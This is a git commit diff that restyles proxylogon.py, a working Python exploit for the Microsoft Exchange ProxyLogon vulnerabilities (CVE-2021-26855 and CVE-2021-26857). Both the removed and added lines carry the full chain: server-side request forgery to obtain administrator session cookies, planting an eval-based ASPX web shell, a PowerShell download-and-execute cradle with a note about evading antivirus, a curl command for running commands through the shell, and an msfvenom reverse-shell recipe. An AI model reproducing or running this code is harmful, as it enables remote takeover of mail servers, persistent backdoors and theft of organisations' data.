e414e20d57e7cfc9aa57c915b1ce54b16e7007e7
NumbFrank <gazlockwood@gmail.com>
2021-03-17 10:53:30 +0000

    Refactor to pep8 standards

--- proxylogon.py
+++ proxylogon.py
@@ -35,31 +35,29 @@ class ProxyLogon:
     def __init__(self, target, user, cmd, revPSScriptUrl):
         self.target = target
         self.user = user
-        self.cmd = "" if cmd == None else cmd
+        self.cmd = "" if cmd is None else cmd
         self.ps_script_url = (
             ""
-            if revPSScriptUrl == None
-            else "powershell -exec bypass -nop -c IEX (new-object net.webclient).downloadstring('%s') "  # AV will catch this consider updating
-            % (revPSScriptUrl)
+            if revPSScriptUrl is None
+            # AV will catch this consider updating
+            else f"powershell -exec bypass -nop -c IEX (new-object net.webclient).downloadstring('{revPSScriptUrl}') "
         )
         self.user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
-        self.shell_name = ProxyLogon.GetRandomString() + ".aspx"
-        self.endpoint_name = ProxyLogon.GetRandomString() + ".js"
-        self.shell_path = (
-            "\\\\127.0.0.1\\c$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\%s"
-            % self.shell_name
-        )
-        self.shell_url = "https://%s/owa/auth/%s" % (self.target, self.shell_name)
+        self.shell_name = f"{ProxyLogon.get_random_string()}.aspx"
+        self.endpoint_name = f"{ProxyLogon.get_random_string()}.js"
+        self.shell_path = f"\\\\127.0.0.1\\c$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\{self.shell_name}"
+        self.shell_url = f"https://{self.target}/owa/auth/{self.shell_name}"
+        self.ecp_url = f"https://{self.target}/ecp/{self.endpoint_name}"
         self.shell_payload = 'http://iml/#<script language="JScript" runat="server">function Page_Load(){eval(Request["cmd"],"unsafe");}</script>'
 
     @staticmethod
-    def GetRandomString(size=5, chars=string.ascii_lowercase + string.digits) -> str:
+    def get_random_string(size=5, chars=string.ascii_lowercase + string.digits) -> str:
         return "".join(random.choice(chars) for _ in range(size))
 
-    def PopulateFQDN(self):
+    def populate_fqdn(self):
         print("Attempting to get FQDN.")
         result = requests.get(
-            "https://%s/ecp/%s" % (self.target, self.endpoint_name),
+            self.ecp_url,
             headers={
                 "Cookie": "X-BEResource=localhost~1942062522",
                 "User-Agent": self.user_agent,
@@ -68,21 +66,17 @@ class ProxyLogon:
         )
         if "X-CalculatedBETarget" in result.headers and "X-FEServer" in result.headers:
             self.fqdn = result.headers["X-FEServer"]
-            print("Target FQDN: %s" % self.fqdn)
+            print(f"Target FQDN: {self.fqdn}")
         else:
             print("Failed to get FQDN.")
 
-    def PopulateServerInfo(self):
+    def populate_server_info(self):
         print("Attempting to get Server and LegacyDN.")
-        auto_discover_body = (
-            """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>"""
-            % self.user
-        )
+        auto_discover_body = f"""<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>{self.user}</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>"""
         result = requests.post(
-            "https://%s/ecp/%s" % (self.target, self.endpoint_name),
+            self.ecp_url,
             headers={
-                "Cookie": "X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;"
-                % self.fqdn,
+                "Cookie": f"X-BEResource={self.fqdn}/autodiscover/autodiscover.xml?a=~1942062522;",
                 "Content-Type": "text/xml",
                 "User-Agent": self.user_agent,
             },
@@ -92,22 +86,19 @@ class ProxyLogon:
         if result.status_code != 200:
             print("Autodiscover failure.")
 
-        self.legacy_dn = result.text.split("<LegacyDN>")[1].split("</LegacyDN>")[0]
+        self.legacy_dn = result.text.split(
+            "<LegacyDN>")[1].split("</LegacyDN>")[0]
         self.server_id = result.text.split("<Server>")[1].split("</Server>")[0]
-        print("LegacyDN: %s" % (self.legacy_dn))
-        print("ServerID: %s" % (self.server_id))
+        print(f"LegacyDN: {self.legacy_dn}")
+        print(f"ServerID: {self.server_id}")
 
-    def PopulateSid(self):
+    def populate_sid(self):
 
-        mapi_payload = (
-            self.legacy_dn
-            + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
-        )
+        mapi_payload = f"{self.legacy_dn}\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
         result = requests.post(
-            "https://%s/ecp/%s" % (self.target, self.endpoint_name),
+            self.ecp_url,
             headers={
-                "Cookie": "X-BEResource=Administrator@%s:444/mapi/emsmdb?MailboxId=%s&a=~1942062522;"
-                % (self.fqdn, self.server_id),
+                "Cookie": f"X-BEResource=Administrator@{self.fqdn}:444/mapi/emsmdb?MailboxId={self.server_id}&a=~1942062522;",
                 "Content-Type": "application/mapi-http",
                 "X-Requesttype": "Connect",
                 "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
@@ -123,18 +114,18 @@ class ProxyLogon:
             print("Failed on SID.")
             exit(0)
 
-        self.sid = result.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
-        print("Administrator Sid: %s" % self.sid)
+        self.sid = result.text.split("with SID ")[1].split(
+            " and MasterAccountSid")[0]
+        print(f"Administrator Sid: {self.sid}")
 
-    def PopulateSessionInfo(self):
+    def populate_session_info(self):
         print("Attempting to set Administrator cookie.")
-        body_payload = """<r at="Negotiate" ln="stormcrow"><s>%s</s></r>""" % self.sid
+        body_payload = f"""<r at="Negotiate" ln="stormcrow"><s>{self.sid}</s></r>"""
 
         result = requests.post(
-            "https://%s/ecp/%s" % (self.target, self.endpoint_name),
+            self.ecp_url,
             headers={
-                "Cookie": "X-BEResource=Administrator@%s:444/ecp/proxyLogon.ecp?a=~1942062522;"
-                % self.fqdn,
+                "Cookie": f"X-BEResource=Administrator@{self.fqdn}:444/ecp/proxyLogon.ecp?a=~1942062522;",
                 "Content-Type": "text/xml",
                 "msExchLogonMailbox": self.sid,
                 "User-Agent": self.user_agent,
@@ -148,25 +139,21 @@ class ProxyLogon:
             exit(0)
 
         self.session_id = (
-            result.headers["set-cookie"].split("ASP.NET_SessionId=")[1].split(";")[0]
+            result.headers["set-cookie"].split("ASP.NET_SessionId=")[
+                1].split(";")[0]
         )
         self.session_canary = (
-            result.headers["set-cookie"].split("msExchEcpCanary=")[1].split(";")[0]
+            result.headers["set-cookie"].split("msExchEcpCanary=")[
+                1].split(";")[0]
         )
         print("Administrator cookie set.")
 
-    def PopulateOfflineAddressBookId(self):
+    def populate_offline_address_book_id(self):
         print("Getting Offline Address Book ID.")
         result = requests.post(
-            "https://%s/ecp/%s" % (self.target, self.endpoint_name),
+            self.ecp_url,
             headers={
-                "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s"
-                % (
-                    self.fqdn,
-                    self.session_canary,
-                    self.session_id,
-                    self.session_canary,
-                ),
+                "Cookie": f"X-BEResource=Administrator@{self.fqdn}:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary={self.session_canary}&a=~1942062522; ASP.NET_SessionId={self.session_id}; msExchEcpCanary={self.session_canary}",
                 "Content-Type": "application/json; charset=utf-8",
                 "Accept-Language": "en-US,en;q=0.5",
                 "X-Requested-With": "XMLHttpRequest",
@@ -189,9 +176,9 @@ class ProxyLogon:
             print("Get OAB Error!")
             exit()
         self.oabId = result.text.split('"RawIdentity":"')[1].split('"')[0]
-        print("OAB id: " + self.oabId)
+        print(f"OAB id: {self.oabId}")
 
-    def PushOABShell(self):
+    def push_oab_shell(self):
         print("Pushing OAB shell")
         OAB_payload = {
             "identity": {
@@ -207,15 +194,9 @@ class ProxyLogon:
             },
         }
         result = requests.post(
-            "https://%s/ecp/%s" % (self.target, self.endpoint_name),
+            self.ecp_url,
             headers={
-                "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s"
-                % (
-                    self.fqdn,
-                    self.session_canary,
-                    self.session_id,
-                    self.session_canary,
-                ),
+                "Cookie": f"X-BEResource=Administrator@{self.fqdn}:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary={self.session_canary}&a=~1942062522; ASP.NET_SessionId={self.session_id}; msExchEcpCanary={self.session_canary}",
                 "Content-Type": "application/json; charset=utf-8",
                 "Accept-Language": "en-US,en;q=0.5",
                 "X-Requested-With": "XMLHttpRequest",
@@ -232,7 +213,7 @@ class ProxyLogon:
 
         print("Shell in position")
 
-    def PopOABShell(self):
+    def pop_oab_shell(self):
         OAB_Payload = {
             "identity": {
                 "__type": "Identity:ECP",
@@ -247,15 +228,9 @@ class ProxyLogon:
             },
         }
         result = requests.post(
-            "https://%s/ecp/%s" % (self.target, self.endpoint_name),
+            self.ecp_url,
             headers={
-                "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s"
-                % (
-                    self.fqdn,
-                    self.session_canary,
-                    self.session_id,
-                    self.session_canary,
-                ),
+                "Cookie": f"X-BEResource=Administrator@{self.fqdn}:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary={self.session_canary}&a=~1942062522; ASP.NET_SessionId={self.session_id}; msExchEcpCanary={self.session_canary}",
                 "Content-Type": "application/json; charset=utf-8",
                 "Accept-Language": "en-US,en;q=0.5",
                 "X-Requested-With": "XMLHttpRequest",
@@ -266,18 +241,12 @@ class ProxyLogon:
             verify=False,
         )
         print("Shell ready, you can post extra commands to this with 'cmd' parameter:")
-        print(
-            """e.g. curl -X POST --url %s --header 'Content-Type: application/x-www-form-urlencoded' --data 'cmd=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami /all").stdout.readall())' -ks"""
-            % self.shell_url
-        )
+        print(f"""e.g. curl -X POST --url {self.shell_url} --header 'Content-Type: application/x-www-form-urlencoded' --data 'cmd=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami /all").stdout.readall())' -ks""")
 
-    def ExecCmd(self, command):
-        print("Executing: %s" % command)
+    def exec_cmd(self, command):
+        print(f"Executing: {command}")
         time.sleep(5)
-        shell_payload = (
-            """cmd=Response.Write(new ActiveXObject("WScript.Shell").exec("%s").stdout.readall())"""
-            % command
-        )
+        shell_payload = f"""cmd=Response.Write(new ActiveXObject("WScript.Shell").exec("{command}").stdout.readall())"""
         result = requests.post(
             self.shell_url,
             headers={
@@ -294,24 +263,24 @@ class ProxyLogon:
     def run(self):
         # CVE-2021-26855
         print("Executing CVE-2021-26855")
-        self.PopulateFQDN()
-        self.PopulateServerInfo()
-        self.PopulateSid()
-        self.PopulateSessionInfo()
+        self.populate_fqdn()
+        self.populate_server_info()
+        self.populate_sid()
+        self.populate_session_info()
         # CVE-2021-26857
         print("Moving onto CVE-2021-26857")
-        self.PopulateOfflineAddressBookId()  # OAB
-        self.PushOABShell()
-        self.PopOABShell()
+        self.populate_offline_address_book_id()  # OAB
+        self.push_oab_shell()
+        self.pop_oab_shell()
         # Pop that powershell
         if self.cmd != "":
-            self.ExecCmd(self.cmd)
+            self.exec_cmd(self.cmd)
         if self.ps_script_url != "":
-            self.ExecCmd(self.ps_script_url)
+            self.exec_cmd(self.ps_script_url)
         return 0
 
 
-def GetArgs():
+def get_args():
     parser = argparse.ArgumentParser(
         prog="ProxyLogon",
         epilog="msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=8443 -f psh -o shell.ps1",
@@ -322,7 +291,7 @@ def GetArgs():
         "-t", "--target", type=str, help="Exchange server to target.", required=True
     )
     parser.add_argument(
-        "-e", "--user", type=str, help="User email address to target.", required=True
+        "-u", "--user", type=str, help="User email address to target.", required=True
     )
     group = parser.add_mutually_exclusive_group(required=True)
     group.add_argument(
@@ -339,7 +308,7 @@ def GetArgs():
 
 
 def main():
-    args = GetArgs()
+    args = get_args()
     proxyLogon = ProxyLogon(args.target, args.user, args.cmd, args.psurl)
     proxyLogon.run()
 
